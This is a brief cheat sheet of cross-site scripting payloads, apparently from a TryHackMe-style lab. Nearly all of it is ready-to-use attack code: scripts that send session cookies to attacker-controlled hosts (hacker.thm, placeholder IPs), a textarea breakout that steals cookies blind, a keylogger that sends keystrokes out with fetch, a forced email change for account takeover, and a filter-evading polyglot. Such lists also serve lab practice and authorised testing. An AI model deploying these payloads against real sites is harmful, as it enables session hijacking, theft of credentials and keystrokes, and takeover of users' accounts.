# XSS-Payloads

## Poc 
<script>alert('XSS');</script>

___

## Session Stealing
<script>fetch('https://hacker.thm/stealcookie=' + btoa(document.cookie));</script>

<script>
new Image().src='http://TU_IP:8080/stealc='+document.cookie;
</script>

### Blind TextArea cokie steal
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBERcookie=' + btoa(document.cookie) );</script> 
___

## Key Logger

<script>document.onkeypress = function(e) { fetch('https://hacker.thm/logkey=' + btoa(e.key) );}</script>
___

## Business Logic
> The attacker can call specific functions like changeEmail 

<script>user.changeEmail('attacker@hacker.thm');</script>
___


## Polyglots:
>An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. 

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e


